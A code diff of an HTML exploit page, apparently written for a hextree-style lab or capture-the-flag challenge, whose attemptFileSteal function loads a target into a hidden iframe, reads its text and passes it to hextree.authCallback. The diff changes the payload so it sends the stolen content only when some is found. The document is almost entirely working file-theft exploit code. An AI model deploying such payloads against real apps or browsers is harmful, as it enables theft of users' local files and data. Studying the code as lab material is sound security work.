@@ -8,15 +8,21 @@
     <pre id="leakedContent">Loading...</pre>
 
     <script>
-      hextree.authCallback("a"); // This will avoid Timeout .......
       function attemptFileSteal() {
         const iframe = document.createElement('iframe');
-        iframe.style.display = 'none'; // hide iframe if you want
+        iframe.style.display = 'none';
         iframe.onload = () => {
           try {
             const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             const content = iframeDoc.body.textContent;
             document.getElementById('leakedContent').innerText = content;
+            
+            // Call authCallback only if content is found
+            if (content && content.trim().length > 0) {
+              hextree.authCallback(content.trim());
+            } else {
+              document.getElementById('leakedContent').innerText = 'EMPTY OR BLOCKED';
+            }
           } catch (e) {
             document.getElementById('leakedContent').innerText = 'SOP BLOCKED';
           }
@@ -29,4 +35,3 @@
     </script>
   </body>
 </html>
-
